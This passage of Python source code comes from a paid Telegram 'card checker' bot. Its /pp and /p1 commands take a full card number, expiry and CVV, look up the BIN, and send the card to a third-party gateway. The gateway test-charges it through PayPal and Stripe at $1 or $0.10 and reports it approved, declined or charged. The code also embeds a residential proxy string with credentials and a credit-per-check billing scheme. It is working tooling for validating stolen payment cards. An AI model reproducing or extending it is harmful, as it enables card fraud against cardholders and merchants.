            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Error checking card:</b>"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            error_msg = f"⚠️ <b>Error:</b> <code>{str(e)}</code>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
        # Removed finally block for active_requests cleanup
    
    # Schedule the background task without awaiting it
    asyncio.create_task(background_check())

# Also add a handler for /stt command as an alias
async def handle_stt_command(update, context):
    """
    Handle the /stt command as an alias for /st.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Just call the st handler
    await handle_st_command(update, context)



# ============================================================
# MODULE: pp
# ============================================================
# Configure logging

# API endpoint
API_BASE_URL = PAYPAL_PROXY_API_URL

# Proxy Configuration
# Using the specific proxy string you provided in the example
PROXY_STRING = "http://user-FG9IqFSVPYNRnxxV-type-residential-session-c3ngj9de-country-US-city-Albuquerque-rotation-5:RCMd2xUcgo5Swkxo@geo.g-w.info:10080"

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def pp_parse_card_details(card_string: str) -> Optional[tuple]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def pp_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def pp_check_card_paypal(card_details: str, user_info: dict) -> Optional[str]:
    """
    Check card details using PayPal 1$ API asynchronously with aiohttp.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = pp_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /pp card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Construct API URL
    # Proxy is passed as a QUERY PARAMETER for the API to use internally.
    # The bot connects DIRECTLY to the API (no proxy argument in session.get).
    card_string = f"{card_number}|{month}|{year}|{cvv}"
    
    # Encode the proxy string for URL safety (optional but good practice)
    safe_proxy_string = quote(PROXY_STRING, safe='')
    
    api_url = f"{API_BASE_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={card_string}"
    
    # Retry configuration
    max_retries = 3
    retry_delay = 2  # seconds
    
    for attempt in range(max_retries):
        try:
            # Create an aiohttp session
            async with aiohttp.ClientSession() as session:
                # Make API request asynchronously WITHOUT passing a proxy argument
                # This fixes the "Server disconnected" error.
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=50)) as response:
                    # Check for 500 error specifically
                    if response.status == 500:
                        if attempt < max_retries - 1:  # Don't sleep on the last attempt
                            await asyncio.sleep(retry_delay * (attempt + 1))  # Exponential backoff
                            continue
                        else:
                            # All retries failed, return generic error
                            return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
                    
                    api_response = await response.json()
            
            # Format and return response
            return pp_format_response_paypal(api_response, user_info, card_details, brand, issuer, country_name, country_flag)
        
        except aiohttp.ClientConnectorError as e:
            # Connection errors (DNS, Refused, Disconnected)
            logger.error(f"Connection error checking card: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay * (attempt + 1))
                continue
            else:
                return "⚠️ <b>Connection to API failed. Please try again later.</b>"
                
        except aiohttp.ClientError as e:
            logger.error(f"HTTP error checking card with PayPal 1$: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay * (attempt + 1))
                continue
            else:
                # All retries failed, return generic error without leaking API details
                return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
        
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error checking card with PayPal 1$: {e}")
            return "⚠️ <b>An error occurred while processing the response.</b>\n\n<i>Please try again later.</i>"
        
        except Exception as e:
            logger.error(f"Unexpected error checking card with PayPal 1$: {e}")
            # Don't expose the actual error to the user
            return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
    
    # This should never be reached, but just in case
    return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"

def pp_format_response_paypal(api_response: dict, user_info: dict, card_details: str, 
                           brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format API response into a beautiful message with emojis for PayPal 1$.
    
    Args:
        api_response: Dictionary containing API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    # Extract response fields
    code = api_response.get("code", "")
    message = api_response.get("response", api_response.get("message", ""))
    status = api_response.get("status", "")
    
    # Determine response text based on code
    if code == "CARD_GENERIC_ERROR":
        response_text = "ISSUER_DECLINE"
    else:
        response_text = code
    
    # Determine status style based on status content
    status_lower = status.lower()
    if "approved" in status_lower:
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
    elif "declined" in status_lower:
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
    else:
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔥"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format response with exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 1$</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_pp_command(update, context):
    """
    Handle the /pp command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = pp_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /pp card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /pp</i>", 
            parse_mode="HTML"
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML"
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 1$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await pp_check_card_paypal(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>An error occurred"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            # Don't expose the actual error to the user
            error_msg = "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())



# ============================================================
# MODULE: p1
# ============================================================
# Configure logging

# API endpoint
API_BASE_URL = PAYPAL_API_URL

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def p1_parse_card_details(card_string: str) -> Optional[tuple]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def p1_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def p1_check_card_paypal(card_details: str, user_info: dict) -> Optional[str]:
    """
    Check card details using PayPal 0.10$ API asynchronously with aiohttp.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = p1_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /p1 card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Construct the API URL with the correct format
    card_string = f"{card_number}|{month}|{year}|{cvv}"
    api_url = f"{API_BASE_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={card_string}"
    
    try:
        # Create an aiohttp session for async HTTP requests
        async with aiohttp.ClientSession() as session:
            # Make API request asynchronously
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"}, timeout=aiohttp.ClientTimeout(total=60)) as response:
                                api_response = await response.json()
        
        # Format and return the response
        return p1_format_response_paypal(api_response, user_info, card_details, brand, issuer, country_name, country_flag)
    
    except Exception as e:
        logger.error(f"Error checking card with PayPal 0.10$: {e}")
        return f"⚠️ <b>Error checking card:</b> <code>{str(e)}</code>"

def p1_format_response_paypal(api_response: dict, user_info: dict, card_details: str, 
                           brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format the API response into a beautiful message with emojis for PayPal 0.10$.
    
    Args:
        api_response: Dictionary containing the API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    # Extract response fields
    code = api_response.get("code", "")
    message = api_response.get("response", api_response.get("message", ""))
    status = api_response.get("status", "")
    
    # Determine response text based on code
    if code == "CARD_GENERIC_ERROR":
        response_text = "ISSUER_DECLINE"
    else:
        response_text = code
    
    # Determine status style based on status content
    status_lower = status.lower()
    if "approved" in status_lower:
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
    elif "declined" in status_lower:
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
    else:
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔄"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 0.10$</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_p1_command(update, context):
    """
    Handle the /p1 command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = p1_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /p1 card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /p1</i>", 
            parse_mode="HTML"
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML"
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
